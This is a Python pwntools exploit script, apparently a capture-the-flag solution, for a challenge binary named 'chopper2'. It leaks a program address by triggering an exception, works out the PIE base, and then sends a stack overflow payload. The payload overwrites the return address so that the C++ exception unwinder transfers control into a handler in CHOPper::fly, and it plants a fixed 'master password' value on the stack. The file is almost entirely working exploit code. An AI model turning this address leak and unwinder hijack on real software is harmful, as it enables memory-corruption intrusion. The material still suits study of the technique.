#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("../setup/chopper2")
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ["tmux", "new-window"]

host = args.HOST or "127.0.0.1"
port = int(args.PORT or 1337)


def log_addr(name, addr):
    log.info("{} @ {:#x}".format(name, addr))


def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

if args.GDB:
    gdb.attach(
        io,
        gdbscript="""
        b CHOPper::customizeWeight
        brva 0x25cd
        c
        c
    """,
    )
    # piebase 0x7f0


# Customize blade length
io.sendlineafter(b": ", "1")
io.sendlineafter(b": ", "3")

# Provide a non-float to trigger an invalid_argument exception.
# This leaks the address of CHOPper::bladeLenRatio
io.sendlineafter(b": ", "a")
io.recvuntil(b"@ ")
leak = int(io.recvline().strip(), 16)
# Calculate base address of the program
exe.address = leak - exe.sym["_ZN7CHOPper13bladeLenRatioE"]
log_addr("Leak", leak)
log_addr("Base", exe.address)

offset = 0x58
large_num = b"9" * 20

# Start with a large number to throw an out_of_range exception
payload = large_num
payload += b"a" * 20
# Place the master password on the stack, the exception hanlder in CHOPper::fly
# will read it from here
payload += p32(0xDEADBEEF)
payload += b"b" * 12
# This is needed to prevent a crash when the exception handler runs
payload += p64(exe.sym["got._ZSt4cout"])  # cout
payload += cyclic(offset - len(payload), n=8)
# Overwrite return address with an address that falls in the call-site range
# associated with the exception handler in CHOPper::fly. The unwinder will
# think the exception was raised from there and transfer control to the
# exception handler inside CHOPper::fly
payload += p64(exe.sym["_ZN7CHOPper3flyEv"] + 206)

io.sendlineafter(b": ", "2")
io.sendlineafter(b": ", payload)

# print(io.recvall())

io.interactive()
